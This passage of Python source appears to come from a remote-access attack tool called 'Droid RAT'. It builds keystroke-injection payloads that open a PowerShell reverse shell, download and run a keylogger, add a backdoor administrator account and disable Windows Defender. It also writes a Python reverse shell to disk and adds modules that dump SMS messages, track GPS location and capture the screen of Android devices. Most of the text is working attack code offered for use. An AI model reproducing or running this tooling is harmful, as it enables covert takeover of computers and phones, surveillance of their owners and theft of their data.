        "5": ("Backdoor User", "Creates a backdoor user account"),
        "6": ("Disable AV", "Disables antivirus software"),
        "7": ("Custom Payload", "Enter your own Ducky Script")
    }
    for k, (name, desc) in payloads.items():
        print(f"  {colorize(f'[{k}]', 'yellow')} {colorize(name, 'cyan'):<25} {desc}")
    
    choice = input(f"\n{colorize('Select payload: ', 'cyan')}").strip()
    lhost = config.get("lhost", "127.0.0.1")
    lport = config.get("lport", 4444)
    
    if choice == '1':
        script = f"""DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"
ENTER"""
    elif choice == '7':
        print("\nEnter Ducky Script (end with 'DONE'):")
        lines = []
        while True:
            line = input()
            if line.strip() == 'DONE':
                break
            lines.append(line)
        script = '\n'.join(lines)
    else:
        payload_map = {
            '2': f"""DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -Command "$c=@(); Get-ChildItem -Path $env:USERPROFILE -Recurse -Filter *.txt -ErrorAction SilentlyContinue | ForEach-Object {{ $c += $_.FullName }}; $c | Out-File $env:temp\\\\harvest.txt"\nENTER""",
            '3': f"""DELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c "netsh wlan show profiles | findstr Profiles" > %temp%\\\\wifi.txt\nENTER""",
            '4': f"""DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/keylog.ps1')"\nENTER""",
            '5': f"""DELAY 1000\nGUI r\nDELAY 500\nSTRING net user hacker P@ssw0rd! /add && net localgroup Administrators hacker /add\nENTER""",
            '6': """DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -Command "Stop-Service WinDefend; Set-MpPreference -DisableRealtimeMonitoring $true"\nENTER"""
        }
        script = payload_map.get(choice, "")
    
    payload_file = f"{PAYLOADS_DIR}/bluet_ducky_payload.txt"
    with open(payload_file, 'w') as f:
        f.write(script)
    
    print(colorize(f"\n[+] Ducky Script saved: {payload_file}", "green"))
    print(colorize("\n[*] To deploy:", "yellow"))
    print(colorize("    1. Pair via Bluetooth as HID keyboard", "yellow"))
    print(colorize("    2. Upload script to Bluetooth HID device", "yellow"))
    print(colorize("    3. Run injection (e.g., Raspberry Pi Zero HID)", "yellow"))
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


def android_tv_remote():
    """Android TV remote control"""
    print(colorize("\n[*] Android TV Remote Control", "cyan"))
    print(colorize("[*] Emulate Android TV remote via ADB\n", "yellow"))
    print(colorize("    ADB over network:", "dim"))
    print(colorize("    $ adb connect <TV_IP>:5555", "dim"))
    print(colorize("    $ adb shell input keyevent KEYCODE_HOME", "dim"))
    keycodes = ["HOME", "DPAD_UP", "DPAD_DOWN", "DPAD_LEFT", "DPAD_RIGHT", 
                "DPAD_CENTER", "BACK", "MENU", "VOLUME_UP", "VOLUME_DOWN", "POWER"]
    for k in keycodes:
        print(f"      KEYCODE_{k}")
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


def bluetooth_mouse_emulation():
    """Bluetooth mouse emulation"""
    print(colorize("\n[*] Bluetooth Mouse Emulation", "cyan"))
    print(colorize("[*] Emulate HID mouse over Bluetooth\n", "yellow"))
    print(colorize("    For Raspberry Pi Zero:", "dim"))
    print(colorize("    1. Enable Bluetooth HID gadget mode", "dim"))
    print(colorize("    2. Configure as Bluetooth mouse", "dim"))
    print(colorize("    3. Send mouse movement/click events", "dim"))
    print(colorize("\n[+] Mouse HID report format:", "green"))
    print(colorize("    Byte 0: Buttons (1=left, 2=right, 4=middle)", "dim"))
    print(colorize("    Byte 1: X movement (signed)", "dim"))
    print(colorize("    Byte 2: Y movement (signed)", "dim"))
    print(colorize("    Byte 3: Wheel (signed)", "dim"))
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


def custom_hid_payload():
    """Create custom HID payload"""
    print(colorize("\n[*] Custom HID Payload Generator", "cyan"))
    print(f"\n  {colorize('[1]', 'yellow')} Windows  {colorize('[2]', 'yellow')} Linux  {colorize('[3]', 'yellow')} macOS  {colorize('[4]', 'yellow')} Android")
    target = input(f"\n{colorize('Target: ', 'cyan')}").strip()
    cmd = input("Command to execute: ").strip()
    
    scripts = {
        '1': f"DELAY 1000\nGUI r\nDELAY 300\nSTRING powershell -Command \"{cmd}\"\nENTER",
        '2': f"DELAY 1000\nALT F2\nDELAY 300\nSTRING {cmd}\nENTER",
        '3': f"DELAY 1000\nGUI SPACE\nDELAY 300\nSTRING terminal\nENTER\nDELAY 500\nSTRING {cmd}\nENTER",
        '4': f"DELAY 1000\nHOME\nDELAY 300\nTAP 200 200\nDELAY 300\nSTRING {cmd}\nENTER"
    }
    script = scripts.get(target, scripts.get('1'))
    
    payload_file = f"{PAYLOADS_DIR}/custom_hid_{generate_id()}.txt"
    with open(payload_file, 'w') as f:
        f.write(script)
    print(colorize(f"\n[+] HID payload created: {payload_file}", "green"))
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


# ============================================================
# OTG USB RUN
# ============================================================

def otg_usb_run():
    """Run module via OTG USB"""
    print(colorize("\n=== OTG USB Run ===", "cyan"))
    print(colorize("[*] Run modules via USB On-The-Go\n", "yellow"))
    
    print(f"  {colorize('[1]', 'yellow')} USB HID Keyboard (Rubber Ducky Style)")
    print(f"  {colorize('[2]', 'yellow')} USB Ethernet/RNDIS")
    print(f"  {colorize('[3]', 'yellow')} USB Mass Storage")
    print(f"  {colorize('[4]', 'yellow')} USB Serial Debug")
    print(f"  {colorize('[5]', 'yellow')} Deploy Payload via MTP")
    print(f"  {colorize('[B]', 'red')} Back to Main Menu")
    
    choice = input(f"\n{colorize('Select OTG vector: ', 'cyan')}").strip()
    
    if choice == '1':
        print(colorize("\n[*] OTG HID Keyboard Attack", "cyan"))
        print(colorize("    Requirements: Kernel with HID gadget, root", "yellow"))
        print(colorize("\n    $ su", "dim"))
        print(colorize("    $ modprobe g_hid", "dim"))
        print(colorize("    $ echo -ne '\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00' > /dev/hidg0", "dim"))
        print(colorize("\n    Tools: Rucky (github.com/mayankmetha/Rucky)", "green"))
    elif choice == '2':
        print(colorize("\n[*] OTG USB Ethernet/RNDIS", "cyan"))
        print(colorize("    Enable USB tethering on Android", "yellow"))
        print(colorize("    Target detects as network interface", "dim"))
        print(colorize("    $ echo 1 > /proc/sys/net/ipv4/ip_forward", "dim"))
    elif choice == '3':
        print(colorize("\n[*] OTG USB Mass Storage", "cyan"))
        print(colorize("    Emulate USB drive with malicious files", "yellow"))
        print(colorize("    autorun.inf + payload.exe deployment", "dim"))
        print(colorize("    Note: Windows 10+ blocks autorun by default", "red"))
    elif choice == '4':
        print(colorize("\n[*] OTG USB Serial Debug", "cyan"))
        print(colorize("    Connect to UART pins on embedded devices", "yellow"))
        print(colorize("    $ screen /dev/ttyUSB0 115200", "dim"))
    elif choice == '5':
        adb = check_adb()
        if not adb:
            print(colorize("[!] ADB not found.", "red"))
        else:
            print(colorize("\n[*] Deploy via MTP/ADB", "cyan"))
            payload = input("Path to file to deploy: ").strip()
            if os.path.exists(payload):
                print(colorize(f"[*] Pushing {payload}...", "yellow"))
                subprocess.run([adb, "push", payload, "/sdcard/"], timeout=10)
                print(colorize("[+] Deployed.", "green"))
            else:
                print(colorize("[!] File not found.", "red"))
    elif choice.lower() == 'b':
        return
    
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


# ============================================================
# GENERATE DEFAULT FILES
# ============================================================

def generate_default_payloads():
    """Generate default payload files"""
    py_shell = '''#!/usr/bin/env python3
import socket,subprocess,os,pty,base64,sys,time

def reverse_shell(host="LHOST", port=LPORT):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send(b"[+] Connected\\n")
            while True:
                try:
                    s.send(b"$ ")
                    data = s.recv(4096)
                    if not data or data.strip() == b"exit":
                        break
                    cmd = data.decode().strip()
                    if cmd == "info":
                        import platform
                        info = f"Host: {socket.gethostname()}\\nOS: {platform.platform()}"
                        s.send(info.encode())
                    else:
                        output = subprocess.getoutput(cmd)
                        s.send(output.encode() if output else b"[+] Done\\n")
                except Exception as e:
                    s.send(f"Error: {e}\\n".encode())
            s.close()
            break
        except:
            time.sleep(5)

if __name__ == "__main__":
    reverse_shell()
'''
    with open(f"{PAYLOADS_DIR}/py_reverse_shell.py", "w") as f:
        f.write(py_shell.replace("LHOST", config.get("lhost","127.0.0.1")).replace("LPORT", str(config.get("lport",4444))))

def generate_default_exploits():
    """Generate default exploit scripts"""
    with open(f"{EXPLOITS_DIR}/adb_backdoor.py", "w") as f:
        f.write('''#!/usr/bin/env python3
import subprocess, os, sys

def check_adb():
    adb = os.popen("which adb 2>/dev/null || where adb 2>/dev/null").read().strip()
    return adb or None

def exploit():
    print("[*] ADB Backdoor Exploit")
    adb = check_adb()
    if not adb:
        print("[!] ADB not found.")
        return False
    result = subprocess.run([adb, "devices"], capture_output=True, text=True)
    devices = [l.split('\\t')[0] for l in result.stdout.split('\\n')[1:] if l.strip() and '\\tdevice' in l]
    if not devices:
        print("[!] No devices.")
        return False
    print(f"[+] Target: {devices[0]}")
    print(f"[+] Run: adb -s {devices[0]} shell")
    return True

if __name__ == "__main__":
    exploit()
''')
    
    with open(f"{EXPLOITS_DIR}/privesc_check.py", "w") as f:
        f.write('''#!/usr/bin/env python3
import subprocess, os
print("=== Privesc Check ===\\n")
print(f"Kernel: {subprocess.getoutput('uname -a')}\\n")
print("SUID binaries:")
print(subprocess.getoutput("find / -perm -4000 -type f 2>/dev/null"))
print("\\nWritable dirs:")
print(subprocess.getoutput("find / -writable -type d 2>/dev/null | head -20"))
''')

def generate_default_modules():
    """Generate default module files"""
    with open(f"{MODULES_DIR}/screen_capture.py", "w") as f:
        f.write('''#!/usr/bin/env python3
class Module:
    def __init__(self, session=None):
        self.name = "screen_capture"
        self.session = session
        self.description = "Capture Android device screen"
    def run(self):
        print("[*] Capturing screen...")
        if self.session and hasattr(self.session, 'conn'):
            self.session.conn.send(b"CMD: screencap /sdcard/screen.png\\n")
            print("[+] Screenshot captured!")
        else:
            print("[!] No session.")
''')
    
    with open(f"{MODULES_DIR}/sms_dump.py", "w") as f:
        f.write('''#!/usr/bin/env python3
class Module:
    def __init__(self, session=None):
        self.name = "sms_dump"
        self.session = session
        self.description = "Dump SMS messages"
    def run(self):
        print("[*] Dumping SMS...")
        if self.session and hasattr(self.session, 'conn'):
            self.session.conn.send(b"CMD: content query --uri content://sms/inbox\\n")
        else:
            print("[!] No session.")
''')

    with open(f"{MODULES_DIR}/gps_track.py", "w") as f:
        f.write('''#!/usr/bin/env python3
class Module:
    def __init__(self, session=None):
        self.name = "gps_track"
        self.session = session
        self.description = "Get GPS location"
    def run(self):
        print("[*] Requesting GPS location...")
        if self.session and hasattr(self.session, 'conn'):
            self.session.conn.send(b"CMD: dumpsys location | grep -A 5 'Location'\\n")
            print("[+] GPS data requested.")
        else:
            print("[!] No session.")
''')


# ============================================================
# MAIN
# ============================================================

def main():
    """Main entry point"""
    global config, sessions, listener_running
    
    init_directories()
    load_config()
    generate_default_payloads()
    generate_default_exploits()
    generate_default_modules()
    
    while True:
        banner()
        print_menu()
        
        choice = input(f"\n{colorize('Select option: ', 'cyan')}").strip().lower()
        
        if choice in ('1', 'usb'):
            usb_port_scan()
        elif choice in ('2', 'sessions'):
            session_menu()
        elif choice in ('3', 'config'):
            config_menu()
        elif choice in ('4', 'build'):
            build_dropper()
        elif choice in ('5', 'payload'):
            run_payload()
        elif choice in ('6', 'list'):
            list_payloads()
        elif choice in ('7', 'modules'):
            list_modules()
        elif choice in ('8', 'exploits'):
            list_exploits()
        elif choice in ('9', 'bluet'):
            bluet_ducky()
        elif choice in ('10', 'otg'):
            otg_usb_run()
        elif choice in ('q', 'quit', 'exit'):
            print(colorize("\n[*] Shutting down Droid RAT...", "yellow"))
            if listener_running:
                stop_listener()
            print(colorize("[+] Goodbye!", "green"))
            sys.exit(0)
        else:
            print(colorize("[!] Invalid option.", "red"))
            time.sleep(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colorize("\n\n[*] Interrupted.", "yellow"))
        if 'listener_running' in globals() and listener_running:
            listener_running = False
        sys.exit(0)
